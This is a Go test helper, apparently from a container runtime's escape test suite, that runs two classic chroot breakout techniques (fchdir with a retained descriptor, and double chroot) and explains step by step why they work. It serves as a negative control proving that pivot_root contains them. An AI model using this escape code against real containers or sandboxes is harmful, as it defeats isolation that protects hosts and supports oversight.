// Command breakout attempts to escape its container root and read a file that
// only exists on the host. It runs inside a husk container, driven by the escape
// test suite, and is the negative control for pivot_root: against a container
// built with chroot it should succeed, and against one built with pivot_root
// every technique below should fail.
//
// A suite that only asserts the second half proves nothing. It would pass just
// as happily against an escape attempt that never worked in the first place,
// which is why the same binary is run against both modes and both outcomes are
// required.
package main

import (
	"fmt"
	"os"
	"strings"

	"golang.org/x/sys/unix"
)

// The canary is a file the test suite writes at the real filesystem root,
// holding a token unique to that run. Both the path and the content are checked.
//
// Checking the content is not paranoia. The obvious canary — some well-known
// host path like /etc/hostname — exists inside the alpine rootfs too, with
// plausible contents. An escape attempt that fails and lands back in the
// container reads the container's copy, and the test reports a successful
// breakout that never happened. A unique token cannot be forged by the image.
const canary = "/husk-escape-canary"

func main() {
	if len(os.Args) < 3 {
		fmt.Fprintln(os.Stderr, "usage: breakout {fchdir|double-chroot} EXPECTED-TOKEN")
		os.Exit(2)
	}
	technique, token := os.Args[1], os.Args[2]

	var err error
	switch technique {
	case "fchdir":
		err = fchdirEscape()
	case "double-chroot":
		err = doubleChrootEscape()
	default:
		fmt.Fprintf(os.Stderr, "unknown technique %q\n", technique)
		os.Exit(2)
	}

	if err != nil {
		fmt.Printf("CONTAINED: %v\n", err)
		os.Exit(1)
	}

	content, err := os.ReadFile(canary)
	if err != nil {
		fmt.Printf("CONTAINED: left the root but %s is unreadable: %v\n", canary, err)
		os.Exit(1)
	}
	if got := strings.TrimSpace(string(content)); got != token {
		fmt.Printf("CONTAINED: found a file at %s but its content %q is not the host token; "+
			"this is the container's own filesystem\n", canary, got)
		os.Exit(1)
	}
	fmt.Printf("ESCAPED: read the host canary %s from outside the container root\n", canary)
	os.Exit(0)
}

// fchdirEscape is the classic chroot breakout, and it works because chroot(2)
// changes only the root field of the calling process's fs_struct. It leaves the
// working directory alone and it does nothing whatsoever to the mount namespace.
//
//  1. open(".")      keep a descriptor to a directory that is about to be
//     outside the new root. A descriptor references an inode, not
//     a path, so nothing done to the namespace invalidates it.
//  2. chroot(sub)    move the root down one level. The saved descriptor now
//     points outside it.
//  3. fchdir(fd)     set the working directory from that descriptor. The kernel
//     performs no containment check here — there is no path to
//     check — so the process now has a cwd outside its own root.
//  4. chdir("..")    climb. The kernel does clamp ".." at the root, but only
//     when resolution *starts* inside it. Starting outside, the
//     clamp never engages and each step is an ordinary parent
//     lookup until the real filesystem root is reached.
//  5. chroot(".")    adopt the true root as the new root, and the container is
//     gone.
//
// Nothing here is a kernel bug. chroot was written in 1979 to give a build a
// clean view of the filesystem, not to confine a hostile process, and it has
// never claimed otherwise.
func fchdirEscape() error {
	held, err := os.Open(".")
	if err != nil {
		return fmt.Errorf("open cwd: %w", err)
	}
	defer held.Close()

	if err := os.Mkdir("escape-hatch", 0o700); err != nil && !os.IsExist(err) {
		return fmt.Errorf("mkdir: %w", err)
	}
	if err := unix.Chroot("escape-hatch"); err != nil {
		return fmt.Errorf("chroot: %w", err)
	}
	if err := unix.Fchdir(int(held.Fd())); err != nil {
		return fmt.Errorf("fchdir to the retained descriptor: %w", err)
	}

	// Climb far enough to reach the root from any plausible depth. Extra steps
	// at the root are harmless: ".." of "/" is "/".
	for i := 0; i < 64; i++ {
		if err := unix.Chdir(".."); err != nil {
			return fmt.Errorf("chdir ..: %w", err)
		}
	}
	if err := unix.Chroot("."); err != nil {
		return fmt.Errorf("final chroot: %w", err)
	}
	return nil
}

// doubleChrootEscape is the shorter variant: chroot into a subdirectory without
// chdir-ing first, which leaves the cwd above the new root, then simply climb.
// It works for the same underlying reason — the ".." clamp only applies to
// resolution that begins inside the root — and it needs no retained descriptor
// at all.
func doubleChrootEscape() error {
	if err := os.Mkdir("escape-hatch", 0o700); err != nil && !os.IsExist(err) {
		return fmt.Errorf("mkdir: %w", err)
	}
	if err := unix.Chroot("escape-hatch"); err != nil {
		return fmt.Errorf("chroot: %w", err)
	}
	for i := 0; i < 64; i++ {
		if err := unix.Chdir(".."); err != nil {
			return fmt.Errorf("chdir ..: %w", err)
		}
	}
	if err := unix.Chroot("."); err != nil {
		return fmt.Errorf("final chroot: %w", err)
	}
	return nil
}
